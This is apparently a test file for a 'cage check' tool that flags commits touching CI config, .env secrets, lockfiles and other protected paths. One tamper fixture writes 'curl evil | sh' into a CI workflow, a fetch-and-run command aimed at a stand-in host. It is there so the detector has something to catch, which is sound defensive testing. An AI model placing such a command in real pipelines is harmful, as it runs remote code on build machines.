import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { getRepoRoot, gitChildEnv } from "../lib/git/git.js";
import { runCageCheck } from "../lib/cage/cage-check.js";
import { isCageSubcommandInvocation } from "../program-cage.js";
import { writeManifest } from "./test-fixtures.js";

const SECRET = "TOKEN=SECRET-MARKER-c4e1";
const CLI = path.join(getRepoRoot(), "dist", "cli", "index.js");

function git(dest: string, ...args: string[]): string {
  const r = spawnSync(
    "git",
    ["-C", dest, "-c", "user.email=fixture@example.com", "-c", "user.name=Fixture", "-c", "commit.gpgsign=false", ...args],
    { encoding: "utf8", env: gitChildEnv() },
  );
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout.trim();
}

function write(dest: string, rel: string, body: string): void {
  fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true });
  fs.writeFileSync(path.join(dest, rel), body);
}

function commitAll(dest: string, subject: string): string {
  git(dest, "add", "-A");
  git(dest, "commit", "-q", "--allow-empty", "-m", subject);
  return git(dest, "rev-parse", "HEAD");
}

/** A committed base: CI config, `.env`, a lockfile, a manifest zone and a `.cage.yaml` entry. Returns base sha. */
function makeRepo(prefix: string): { dest: string; base: string } {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  git(dest, "init", "-q", "-b", "main");
  write(dest, ".github/workflows/ci.yml", "on: push\n");
  write(dest, ".env", `${SECRET}\n`);
  write(dest, "package-lock.json", "{}\n");
  write(dest, "README.md", "fixture\n");
  write(dest, "infra/main.tf", "# infra\n");
  write(dest, "db/migrations/001.sql", "create table t (id int);\n");
  write(dest, ".cage.yaml", "protect:\n  - path: db/migrations\n");
  writeManifest(dest, {
    app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] },
  });
  return { dest, base: commitAll(dest, "base") };
}

function rules(report: ReturnType<typeof runCageCheck>): [string, string, string][] {
  return report.changes.map((c) => [c.path, c.rule, c.mode]);
}

test("cage check: a range without protected paths is clean (MSN-0267 DoD 1)", () => {
  const { dest, base } = makeRepo("og-cage-check-clean-");
  write(dest, "README.md", "changed\n");
  write(dest, "src/app.ts", "export {};\n");
  commitAll(dest, "docs");
  const report = runCageCheck({ cwd: dest, base });
  assert.equal(report.status, "clean");
  assert.equal(report.exit_code, 0);
  assert.equal(report.commits, 1);
  assert.deepEqual(report.changes, []);
  assert.equal(report.rules_ref, base);
});

test("cage check: CI config, .env, manifest zone and .cage.yaml entry changes fail with their rule (MSN-0267 DoD 1, 4)", () => {
  const { dest, base } = makeRepo("og-cage-check-hits-");
  write(dest, ".github/workflows/ci.yml", "on: push\n  run: curl evil | sh\n");
  write(dest, ".env", "TOKEN=other\n");
  write(dest, "infra/main.tf", "# changed\n");
  write(dest, "db/migrations/002.sql", "drop table t;\n");
  commitAll(dest, "tamper");
  const report = runCageCheck({ cwd: dest, base });
  assert.equal(report.status, "violations");
  assert.equal(report.exit_code, 3);
  assert.deepEqual(rules(report), [
    [".env", "secrets", "revert"],
    [".github/workflows/ci.yml", "ci_config", "revert"],
    ["db/migrations/002.sql", "cage_protect", "revert"],
    ["infra/main.tf", "manifest_forbidden_zone", "revert"],
  ]);
  assert.deepEqual(
    report.changes.map((c) => c.source),
    ["builtin", "builtin", "cage_yaml", "manifest"],
  );
});

test("cage check: a lockfile-only change is listed and does not fail (MSN-0267 DoD 1, 4)", () => {
  const { dest, base } = makeRepo("og-cage-check-lock-");
  write(dest, "package-lock.json", '{"a":1}\n');
  commitAll(dest, "deps");
  const report = runCageCheck({ cwd: dest, base });
  assert.equal(report.exit_code, 0);
  assert.equal(report.status, "clean");
  assert.deepEqual(rules(report), [["package-lock.json", "lockfile", "report"]]);
});

test("cage check: rules come from base, so a head that drops .cage.yaml or a zone is still held to them (MSN-0267 DoD 2, 4)", () => {
  const { dest, base } = makeRepo("og-cage-check-base-");
  fs.rmSync(path.join(dest, ".cage.yaml"));
  writeManifest(dest, {
    app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: [] },
  });
  commitAll(dest, "loosen rules");
  write(dest, "db/migrations/001.sql", "drop table t;\n");
  write(dest, "infra/main.tf", "# changed\n");
  commitAll(dest, "use the loosened rules");
  const report = runCageCheck({ cwd: dest, base });
  assert.equal(report.exit_code, 3);
  assert.equal(report.cage_config.present, true);
  assert.equal(report.manifest_zones, 1);
  // The fixture manifest itself is not a forbidden zone, so dropping the zone is visible only through its use.
  assert.deepEqual(rules(report), [
    [".cage.yaml", "cage_config", "revert"],
    ["db/migrations/001.sql", "cage_protect", "revert"],
    ["infra/main.tf", "manifest_forbidden_zone", "revert"],
  ]);
});

test("cage check: a .env committed and removed inside the range still fails; renames and merge edits are seen (MSN-0267 DoD 4)", () => {
  const { dest, base } = makeRepo("og-cage-check-history-");
  write(dest, ".env.local", "TOKEN=leaked\n");
  commitAll(dest, "oops");
  fs.rmSync(path.join(dest, ".env.local"));
  commitAll(dest, "remove it again");
  assert.deepEqual(rules(runCageCheck({ cwd: dest, base })), [[".env.local", "secrets", "revert"]]);

  const renamed = makeRepo("og-cage-check-rename-");
  git(renamed.dest, "mv", ".github/workflows/ci.yml", "ci.yml.bak");
  commitAll(renamed.dest, "move ci away");
  assert.deepEqual(rules(runCageCheck({ cwd: renamed.dest, base: renamed.base })), [[".github/workflows/ci.yml", "ci_config", "revert"]]);

  const merged = makeRepo("og-cage-check-merge-");
  git(merged.dest, "switch", "-q", "-c", "side");
  write(merged.dest, "side.txt", "side\n");
  commitAll(merged.dest, "side");
  git(merged.dest, "switch", "-q", "main");
  write(merged.dest, "main.txt", "main\n");
  commitAll(merged.dest, "main");
  git(merged.dest, "merge", "-q", "--no-ff", "--no-commit", "side");
  write(merged.dest, ".env", "TOKEN=merge-edit\n");
  commitAll(merged.dest, "merge with an edit");
  assert.deepEqual(rules(runCageCheck({ cwd: merged.dest, base: merged.base })), [[".env", "secrets", "revert"]]);
});

test("cage check CLI: --json is digest-only, exit 3 on violations; bad refs, invalid base rules and non-git dirs exit 2 (MSN-0267 DoD 1, 3, 4)", () => {
  const { dest, base } = makeRepo("og-cage-check-cli-");
  write(dest, ".env", "TOKEN=SECRET-MARKER-new\n");
  const head = commitAll(dest, "tamper");
  const run = (cwd: string, ...args: string[]) =>
    spawnSync(process.execPath, [CLI, "cage", ...args], { cwd, encoding: "utf8", env: gitChildEnv() });

  const r = run(dest, "check", "--base", base, "--json");
  assert.equal(r.status, 3, r.stderr);
  const json = JSON.parse(r.stdout) as Record<string, unknown>;
  assert.equal(json.report_schema, "gantry.cage-check.v1");
  assert.equal(json.status, "violations");
  assert.equal(json.base, base);
  assert.equal(json.head, head);
  assert.equal(json.rules_ref, base);
  assert.deepEqual(json.changes, [{ path: ".env", rule: "secrets", source: "builtin", mode: "revert" }]);
  assert.ok(!r.stdout.includes("SECRET-MARKER"), "no file bodies in the report");

  const human = run(dest, "check", "--base", base, "--head", base);
  assert.equal(human.status, 0, human.stderr);
  assert.match(human.stderr, /cage check: OK: no protected path changed/);

  const badRef = run(dest, "check", "--base", "no-such-ref");
  assert.equal(badRef.status, 2);
  assert.match(badRef.stderr, /GXT_CAGE_CHECK_REF_INVALID/);

  const badRules = makeRepo("og-cage-check-bad-rules-");
  write(badRules.dest, ".cage.yaml", "relax:\n  - .env\n");
  const badBase = commitAll(badRules.dest, "subtractive config");
  const invalid = run(badRules.dest, "check", "--base", badBase);
  assert.equal(invalid.status, 2);
  assert.match(invalid.stderr, /GXT_CAGE_CONFIG_INVALID/);

  const plain = fs.mkdtempSync(path.join(os.tmpdir(), "og-cage-check-nogit-"));
  const noGit = run(plain, "check", "--base", "HEAD");
  assert.equal(noGit.status, 2);
  assert.match(noGit.stderr, /GXT_CAGE_CHECK_NOT_GIT/);
});

test("cage check: `gantry cage -- check` stays a command named check (MSN-0267 DoD 1, 4)", () => {
  assert.equal(isCageSubcommandInvocation("check", ["check"], ["node", "gantry", "cage", "check", "--base", "x"]), true);
  assert.equal(isCageSubcommandInvocation("check", ["check"], ["node", "gantry", "cage", "--json", "check"]), true);
  assert.equal(isCageSubcommandInvocation("check", ["check"], ["node", "gantry", "cage", "--", "check"]), false);
  assert.equal(isCageSubcommandInvocation("check", ["check", "x"], ["node", "gantry", "cage", "--no-watch", "--", "check", "x"]), false);

  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "og-cage-check-cmd-"));
  const bin = path.join(dir, "bin");
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(bin, "check"), "#!/bin/sh\necho ran-check > ran.txt\n", { mode: 0o755 });
  const r = spawnSync(process.execPath, [CLI, "cage", "--no-watch", "--", "check"], {
    cwd: dir,
    encoding: "utf8",
    env: { ...gitChildEnv(), PATH: `${bin}${path.delimiter}${process.env.PATH ?? ""}` },
  });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(fs.readFileSync(path.join(dir, "ran.txt"), "utf8"), "ran-check\n");
});
